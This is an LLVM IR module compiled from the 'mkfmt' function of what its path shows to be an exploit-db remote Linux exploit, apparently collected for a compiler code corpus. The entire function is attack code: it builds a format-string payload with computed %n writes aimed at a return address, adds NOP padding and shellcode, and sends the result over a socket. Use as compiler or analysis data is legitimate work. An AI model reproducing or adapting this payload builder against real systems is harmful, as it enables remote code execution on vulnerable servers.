; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20953.c_mkfmt.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20953.c_mkfmt.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }

@targets = common dso_local global %struct.TYPE_2__* null, align 8
@type = common dso_local global i64 0, align 8
@buf = common dso_local global i8* null, align 8
@target = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"%c%c%c%c\00", align 1
@retaddr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [49 x i8] c"%%.%du%%38$n%%.%du%%39$n%%.%du%%40$n%%.%du%%41$n\00", align 1
@buflength = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@NOP = common dso_local global i8 0, align 1
@sock = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @mkfmt() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [4 x i32], align 16
  %6 = alloca i8*, align 8
  %7 = alloca [4 x i8], align 1
  store i32 0, i32* %2, align 4
  %8 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %9 = load i64, i64* @type, align 8
  %10 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %8, i64 %9
  %11 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %10, i32 0, i32 0
  %12 = load i32, i32* %11, align 4
  %13 = add nsw i32 35, %12
  store i32 %13, i32* %4, align 4
  %14 = load i8*, i8** @buf, align 8
  %15 = load i8*, i8** @buf, align 8
  %16 = call i32 @strlen(i8* %15)
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %14, i64 %17
  store i8* %18, i8** %6, align 8
  %19 = load i32, i32* @target, align 4
  %20 = and i32 %19, 255
  %21 = trunc i32 %20 to i8
  %22 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  store i8 %21, i8* %22, align 1
  %23 = load i32, i32* @target, align 4
  %24 = and i32 %23, 65280
  %25 = ashr i32 %24, 8
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 1
  store i8 %26, i8* %27, align 1
  %28 = load i32, i32* @target, align 4
  %29 = and i32 %28, 16711680
  %30 = ashr i32 %29, 16
  %31 = trunc i32 %30 to i8
  %32 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 %31, i8* %32, align 1
  %33 = load i32, i32* @target, align 4
  %34 = and i32 %33, -16777216
  %35 = lshr i32 %34, 24
  %36 = trunc i32 %35 to i8
  %37 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 3
  store i8 %36, i8* %37, align 1
  store i32 0, i32* %1, align 4
  br label %38

38:                                               ; preds = %61, %0
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %39, 4
  br i1 %40, label %41, label %64

41:                                               ; preds = %38
  %42 = load i8*, i8** %6, align 8
  %43 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 3
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = call i32 @sprintf(i8* %42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i32 %45, i32 %48, i32 %51, i32 %54)
  %56 = load i8*, i8** %6, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 4
  store i8* %57, i8** %6, align 8
  %58 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %59 = load i8, i8* %58, align 1
  %60 = add i8 %59, 1
  store i8 %60, i8* %58, align 1
  br label %61

61:                                               ; preds = %41
  %62 = load i32, i32* %1, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %1, align 4
  br label %38

64:                                               ; preds = %38
  %65 = load i32, i32* @retaddr, align 4
  %66 = and i32 %65, 255
  %67 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 0
  store i32 %66, i32* %67, align 16
  %68 = load i32, i32* @retaddr, align 4
  %69 = and i32 %68, 65280
  %70 = ashr i32 %69, 8
  %71 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 1
  store i32 %70, i32* %71, align 4
  %72 = load i32, i32* @retaddr, align 4
  %73 = and i32 %72, 16711680
  %74 = ashr i32 %73, 16
  %75 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 2
  store i32 %74, i32* %75, align 8
  %76 = load i32, i32* @retaddr, align 4
  %77 = and i32 %76, -16777216
  %78 = lshr i32 %77, 24
  %79 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 3
  store i32 %78, i32* %79, align 4
  store i32 0, i32* %1, align 4
  br label %80

80:                                               ; preds = %140, %64
  %81 = load i32, i32* %1, align 4
  %82 = icmp slt i32 %81, 4
  br i1 %82, label %83, label %143

83:                                               ; preds = %80
  store i32 0, i32* %3, align 4
  %84 = load i32, i32* %1, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %85
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %4, align 4
  %89 = sub nsw i32 %87, %88
  %90 = icmp slt i32 %89, 10
  br i1 %90, label %91, label %126

91:                                               ; preds = %83
  br label %92

92:                                               ; preds = %124, %91
  %93 = load i32, i32* %3, align 4
  %94 = icmp ne i32 %93, 1
  br i1 %94, label %95, label %125

95:                                               ; preds = %92
  %96 = load i32, i32* %1, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %97
  %99 = load i32, i32* %98, align 4
  %100 = add nsw i32 %99, 256
  %101 = load i32, i32* %1, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %102
  store i32 %100, i32* %103, align 4
  %104 = load i32, i32* %1, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %105
  %107 = load i32, i32* %106, align 4
  %108 = load i32, i32* %4, align 4
  %109 = sub nsw i32 %107, %108
  %110 = icmp sgt i32 %109, 9
  br i1 %110, label %111, label %124

111:                                              ; preds = %95
  %112 = load i32, i32* %4, align 4
  %113 = load i32, i32* %1, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = sub nsw i32 %116, %112
  store i32 %117, i32* %115, align 4
  %118 = load i32, i32* %1, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %119
  %121 = load i32, i32* %120, align 4
  %122 = load i32, i32* %4, align 4
  %123 = add nsw i32 %122, %121
  store i32 %123, i32* %4, align 4
  store i32 1, i32* %3, align 4
  br label %124

124:                                              ; preds = %111, %95
  br label %92

125:                                              ; preds = %92
  br label %139

126:                                              ; preds = %83
  %127 = load i32, i32* %4, align 4
  %128 = load i32, i32* %1, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = sub nsw i32 %131, %127
  store i32 %132, i32* %130, align 4
  %133 = load i32, i32* %1, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 %134
  %136 = load i32, i32* %135, align 4
  %137 = load i32, i32* %4, align 4
  %138 = add nsw i32 %137, %136
  store i32 %138, i32* %4, align 4
  br label %139

139:                                              ; preds = %126, %125
  br label %140

140:                                              ; preds = %139
  %141 = load i32, i32* %1, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %1, align 4
  br label %80

143:                                              ; preds = %80
  %144 = load i8*, i8** %6, align 8
  %145 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 0
  %146 = load i32, i32* %145, align 16
  %147 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 1
  %148 = load i32, i32* %147, align 4
  %149 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 2
  %150 = load i32, i32* %149, align 8
  %151 = getelementptr inbounds [4 x i32], [4 x i32]* %5, i64 0, i64 3
  %152 = load i32, i32* %151, align 4
  %153 = call i32 @sprintf(i8* %144, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.1, i64 0, i64 0), i32 %146, i32 %148, i32 %150, i32 %152)
  %154 = load i8*, i8** @buf, align 8
  %155 = call i32 @strlen(i8* %154)
  store i32 %155, i32* %1, align 4
  br label %156

156:                                              ; preds = %170, %143
  %157 = load i32, i32* %1, align 4
  %158 = load i32, i32* @buflength, align 4
  %159 = load i8*, i8** @shellcode, align 8
  %160 = call i32 @strlen(i8* %159)
  %161 = sub nsw i32 %158, %160
  %162 = sub nsw i32 %161, 1
  %163 = icmp slt i32 %157, %162
  br i1 %163, label %164, label %173

164:                                              ; preds = %156
  %165 = load i8, i8* @NOP, align 1
  %166 = load i8*, i8** @buf, align 8
  %167 = load i32, i32* %1, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %166, i64 %168
  store i8 %165, i8* %169, align 1
  br label %170

170:                                              ; preds = %164
  %171 = load i32, i32* %1, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %1, align 4
  br label %156

173:                                              ; preds = %156
  %174 = load i32, i32* %1, align 4
  store i32 %174, i32* %1, align 4
  br label %175

175:                                              ; preds = %192, %173
  %176 = load i32, i32* %1, align 4
  %177 = load i32, i32* @buflength, align 4
  %178 = sub nsw i32 %177, 1
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %195

180:                                              ; preds = %175
  %181 = load i8*, i8** @shellcode, align 8
  %182 = load i32, i32* %2, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8, i8* %181, i64 %183
  %185 = load i8, i8* %184, align 1
  %186 = load i8*, i8** @buf, align 8
  %187 = load i32, i32* %1, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8, i8* %186, i64 %188
  store i8 %185, i8* %189, align 1
  %190 = load i32, i32* %2, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %2, align 4
  br label %192

192:                                              ; preds = %180
  %193 = load i32, i32* %1, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %1, align 4
  br label %175

195:                                              ; preds = %175
  %196 = load i8*, i8** @buf, align 8
  %197 = load i32, i32* @buflength, align 4
  %198 = sub nsw i32 %197, 1
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8, i8* %196, i64 %199
  store i8 10, i8* %200, align 1
  %201 = load i8*, i8** @buf, align 8
  %202 = load i32, i32* @buflength, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds i8, i8* %201, i64 %203
  store i8 0, i8* %204, align 1
  %205 = load i32, i32* @sock, align 4
  %206 = load i8*, i8** @buf, align 8
  %207 = load i8*, i8** @buf, align 8
  %208 = call i32 @strlen(i8* %207)
  %209 = call i32 @write(i32 %205, i8* %206, i32 %208)
  ret void
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32, i32, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
